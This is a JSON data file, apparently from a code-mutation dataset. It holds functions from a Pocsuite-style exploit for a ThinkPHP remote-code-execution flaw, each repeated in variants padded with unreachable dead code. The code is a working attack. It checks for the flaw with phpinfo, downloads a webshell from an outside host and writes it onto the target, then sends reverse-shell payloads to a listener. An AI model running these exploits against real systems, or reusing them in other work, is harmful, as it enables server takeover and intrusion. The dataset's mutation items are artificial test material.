[
    {
        "func_name": "_check",
        "original": "def _check(self, url):\n    flag = 'PHP Extension Build'\n    data = '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'\n    payloads = ['/index.php?s=captcha']\n    for payload in payloads:\n        vul_url = url + payload\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        r = requests.post(vul_url, data=data, headers=headers)\n        if flag in r.text:\n            return (payload, data)\n    return False",
        "mutated": [
            "def _check(self, url):\n    if False:\n        i = 10\n    flag = 'PHP Extension Build'\n    data = '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'\n    payloads = ['/index.php?s=captcha']\n    for payload in payloads:\n        vul_url = url + payload\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        r = requests.post(vul_url, data=data, headers=headers)\n        if flag in r.text:\n            return (payload, data)\n    return False",
            "def _check(self, url):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    flag = 'PHP Extension Build'\n    data = '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'\n    payloads = ['/index.php?s=captcha']\n    for payload in payloads:\n        vul_url = url + payload\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        r = requests.post(vul_url, data=data, headers=headers)\n        if flag in r.text:\n            return (payload, data)\n    return False",
            "def _check(self, url):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    flag = 'PHP Extension Build'\n    data = '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'\n    payloads = ['/index.php?s=captcha']\n    for payload in payloads:\n        vul_url = url + payload\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        r = requests.post(vul_url, data=data, headers=headers)\n        if flag in r.text:\n            return (payload, data)\n    return False",
            "def _check(self, url):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    flag = 'PHP Extension Build'\n    data = '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'\n    payloads = ['/index.php?s=captcha']\n    for payload in payloads:\n        vul_url = url + payload\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        r = requests.post(vul_url, data=data, headers=headers)\n        if flag in r.text:\n            return (payload, data)\n    return False",
            "def _check(self, url):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    flag = 'PHP Extension Build'\n    data = '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'\n    payloads = ['/index.php?s=captcha']\n    for payload in payloads:\n        vul_url = url + payload\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        r = requests.post(vul_url, data=data, headers=headers)\n        if flag in r.text:\n            return (payload, data)\n    return False"
        ]
    },
    {
        "func_name": "_verify",
        "original": "def _verify(self):\n    result = {}\n    p = self._check(self.url)\n    if p:\n        result['VerifyInfo'] = {}\n        result['VerifyInfo']['URL'] = p[0]\n        result['VerifyInfo']['Postdata'] = p[1]\n    return self.parse_output(result)",
        "mutated": [
            "def _verify(self):\n    if False:\n        i = 10\n    result = {}\n    p = self._check(self.url)\n    if p:\n        result['VerifyInfo'] = {}\n        result['VerifyInfo']['URL'] = p[0]\n        result['VerifyInfo']['Postdata'] = p[1]\n    return self.parse_output(result)",
            "def _verify(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    result = {}\n    p = self._check(self.url)\n    if p:\n        result['VerifyInfo'] = {}\n        result['VerifyInfo']['URL'] = p[0]\n        result['VerifyInfo']['Postdata'] = p[1]\n    return self.parse_output(result)",
            "def _verify(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    result = {}\n    p = self._check(self.url)\n    if p:\n        result['VerifyInfo'] = {}\n        result['VerifyInfo']['URL'] = p[0]\n        result['VerifyInfo']['Postdata'] = p[1]\n    return self.parse_output(result)",
            "def _verify(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    result = {}\n    p = self._check(self.url)\n    if p:\n        result['VerifyInfo'] = {}\n        result['VerifyInfo']['URL'] = p[0]\n        result['VerifyInfo']['Postdata'] = p[1]\n    return self.parse_output(result)",
            "def _verify(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    result = {}\n    p = self._check(self.url)\n    if p:\n        result['VerifyInfo'] = {}\n        result['VerifyInfo']['URL'] = p[0]\n        result['VerifyInfo']['Postdata'] = p[1]\n    return self.parse_output(result)"
        ]
    },
    {
        "func_name": "_attack",
        "original": "def _attack(self):\n    result = {}\n    filename = random_str(6) + '.php'\n    shell_addr = 'https://pocsuite.org/include_files/php_attack.txt'\n    payload = '/index.php?s=captcha&Test=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    vul_url = self.url + payload\n    headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n    data = '_method=__construct&filter=assert&method=get&server[REQUEST_METHOD]=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    requests.post(vul_url, data=data, headers=headers)\n    r = requests.post(self.url + '/' + filename, data='c=phpinfo();', headers=headers)\n    if r.status_code == 200 and 'PHP Extension Build' in r.text:\n        result['ShellInfo'] = {}\n        result['ShellInfo']['URL'] = self.url + '/' + filename\n        result['ShellInfo']['Content'] = shell_addr\n    return self.parse_output(result)",
        "mutated": [
            "def _attack(self):\n    if False:\n        i = 10\n    result = {}\n    filename = random_str(6) + '.php'\n    shell_addr = 'https://pocsuite.org/include_files/php_attack.txt'\n    payload = '/index.php?s=captcha&Test=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    vul_url = self.url + payload\n    headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n    data = '_method=__construct&filter=assert&method=get&server[REQUEST_METHOD]=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    requests.post(vul_url, data=data, headers=headers)\n    r = requests.post(self.url + '/' + filename, data='c=phpinfo();', headers=headers)\n    if r.status_code == 200 and 'PHP Extension Build' in r.text:\n        result['ShellInfo'] = {}\n        result['ShellInfo']['URL'] = self.url + '/' + filename\n        result['ShellInfo']['Content'] = shell_addr\n    return self.parse_output(result)",
            "def _attack(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    result = {}\n    filename = random_str(6) + '.php'\n    shell_addr = 'https://pocsuite.org/include_files/php_attack.txt'\n    payload = '/index.php?s=captcha&Test=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    vul_url = self.url + payload\n    headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n    data = '_method=__construct&filter=assert&method=get&server[REQUEST_METHOD]=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    requests.post(vul_url, data=data, headers=headers)\n    r = requests.post(self.url + '/' + filename, data='c=phpinfo();', headers=headers)\n    if r.status_code == 200 and 'PHP Extension Build' in r.text:\n        result['ShellInfo'] = {}\n        result['ShellInfo']['URL'] = self.url + '/' + filename\n        result['ShellInfo']['Content'] = shell_addr\n    return self.parse_output(result)",
            "def _attack(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    result = {}\n    filename = random_str(6) + '.php'\n    shell_addr = 'https://pocsuite.org/include_files/php_attack.txt'\n    payload = '/index.php?s=captcha&Test=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    vul_url = self.url + payload\n    headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n    data = '_method=__construct&filter=assert&method=get&server[REQUEST_METHOD]=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    requests.post(vul_url, data=data, headers=headers)\n    r = requests.post(self.url + '/' + filename, data='c=phpinfo();', headers=headers)\n    if r.status_code == 200 and 'PHP Extension Build' in r.text:\n        result['ShellInfo'] = {}\n        result['ShellInfo']['URL'] = self.url + '/' + filename\n        result['ShellInfo']['Content'] = shell_addr\n    return self.parse_output(result)",
            "def _attack(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    result = {}\n    filename = random_str(6) + '.php'\n    shell_addr = 'https://pocsuite.org/include_files/php_attack.txt'\n    payload = '/index.php?s=captcha&Test=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    vul_url = self.url + payload\n    headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n    data = '_method=__construct&filter=assert&method=get&server[REQUEST_METHOD]=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    requests.post(vul_url, data=data, headers=headers)\n    r = requests.post(self.url + '/' + filename, data='c=phpinfo();', headers=headers)\n    if r.status_code == 200 and 'PHP Extension Build' in r.text:\n        result['ShellInfo'] = {}\n        result['ShellInfo']['URL'] = self.url + '/' + filename\n        result['ShellInfo']['Content'] = shell_addr\n    return self.parse_output(result)",
            "def _attack(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    result = {}\n    filename = random_str(6) + '.php'\n    shell_addr = 'https://pocsuite.org/include_files/php_attack.txt'\n    payload = '/index.php?s=captcha&Test=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    vul_url = self.url + payload\n    headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n    data = '_method=__construct&filter=assert&method=get&server[REQUEST_METHOD]=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))'.format(filename=filename, url=shell_addr)\n    requests.post(vul_url, data=data, headers=headers)\n    r = requests.post(self.url + '/' + filename, data='c=phpinfo();', headers=headers)\n    if r.status_code == 200 and 'PHP Extension Build' in r.text:\n        result['ShellInfo'] = {}\n        result['ShellInfo']['URL'] = self.url + '/' + filename\n        result['ShellInfo']['Content'] = shell_addr\n    return self.parse_output(result)"
        ]
    },
    {
        "func_name": "_shell",
        "original": "def _shell(self):\n    vulurl = self.url + '/index.php?s=captcha'\n    _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(), os_target=OS.LINUX, os_target_arch=OS_ARCH.X86)\n    for i in _list:\n        data = {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': i}\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        requests.post(vulurl, data=data, headers=headers)",
        "mutated": [
            "def _shell(self):\n    if False:\n        i = 10\n    vulurl = self.url + '/index.php?s=captcha'\n    _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(), os_target=OS.LINUX, os_target_arch=OS_ARCH.X86)\n    for i in _list:\n        data = {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': i}\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        requests.post(vulurl, data=data, headers=headers)",
            "def _shell(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    vulurl = self.url + '/index.php?s=captcha'\n    _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(), os_target=OS.LINUX, os_target_arch=OS_ARCH.X86)\n    for i in _list:\n        data = {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': i}\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        requests.post(vulurl, data=data, headers=headers)",
            "def _shell(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    vulurl = self.url + '/index.php?s=captcha'\n    _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(), os_target=OS.LINUX, os_target_arch=OS_ARCH.X86)\n    for i in _list:\n        data = {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': i}\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        requests.post(vulurl, data=data, headers=headers)",
            "def _shell(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    vulurl = self.url + '/index.php?s=captcha'\n    _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(), os_target=OS.LINUX, os_target_arch=OS_ARCH.X86)\n    for i in _list:\n        data = {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': i}\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        requests.post(vulurl, data=data, headers=headers)",
            "def _shell(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    vulurl = self.url + '/index.php?s=captcha'\n    _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(), os_target=OS.LINUX, os_target_arch=OS_ARCH.X86)\n    for i in _list:\n        data = {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': i}\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        requests.post(vulurl, data=data, headers=headers)"
        ]
    },
    {
        "func_name": "parse_output",
        "original": "def parse_output(self, result):\n    output = Output(self)\n    if result:\n        output.success(result)\n    else:\n        output.fail('target is not vulnerable')\n    return output",
        "mutated": [
            "def parse_output(self, result):\n    if False:\n        i = 10\n    output = Output(self)\n    if result:\n        output.success(result)\n    else:\n        output.fail('target is not vulnerable')\n    return output",
            "def parse_output(self, result):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    output = Output(self)\n    if result:\n        output.success(result)\n    else:\n        output.fail('target is not vulnerable')\n    return output",
            "def parse_output(self, result):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    output = Output(self)\n    if result:\n        output.success(result)\n    else:\n        output.fail('target is not vulnerable')\n    return output",
            "def parse_output(self, result):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    output = Output(self)\n    if result:\n        output.success(result)\n    else:\n        output.fail('target is not vulnerable')\n    return output",
            "def parse_output(self, result):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    output = Output(self)\n    if result:\n        output.success(result)\n    else:\n        output.fail('target is not vulnerable')\n    return output"
        ]
    }
]